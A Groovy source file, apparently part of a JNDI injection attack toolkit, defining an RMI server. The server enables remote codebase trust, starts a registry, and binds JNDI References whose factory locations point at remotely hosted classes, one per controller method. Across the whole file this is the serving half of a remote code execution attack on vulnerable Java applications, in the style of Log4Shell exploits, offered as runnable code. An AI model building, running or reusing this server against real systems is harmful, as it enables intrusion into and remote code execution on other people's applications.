package com.jndi.server

import com.jndi.controller.JndiController
import com.jndi.server.impl.JNDIServer
import com.sun.jndi.rmi.registry.ReferenceWrapper
import groovy.util.logging.Slf4j
import org.springframework.beans.factory.annotation.Autowired
import org.springframework.beans.factory.annotation.Value

import javax.naming.Reference
import java.rmi.registry.LocateRegistry

@Slf4j
class RMIServer implements JNDIServer {

    @Value('${jndi.ip}')
    String ip

    @Value('${jndi.rmi.port}')
    Integer port

    @Autowired
    SimpleJNDIServer jndiServer
    
    @Override
    void run(String... args) throws Exception {
        System.setProperty('com.sun.jndi.ldap.object.trustURLCodebase', 'true')
        System.setProperty('com.sun.jndi.rmi.object.trustURLCodebase', 'true')
        LocateRegistry.createRegistry(port)
        def registry = LocateRegistry.getRegistry()
        def methods = JndiController.class.getDeclaredMethods()
        for(method in methods){
            def jndi = jndiServer.generateClass(method)
            if (jndi){
                def reference = new Reference(jndi.className, jndi.factory, jndi.factoryLocation)
                def referenceWrapper = new ReferenceWrapper(reference)
                registry.bind(jndi.path, referenceWrapper)
            }
        }
        log.info("RMI Server start on ${ip}:${port}")
    }

}

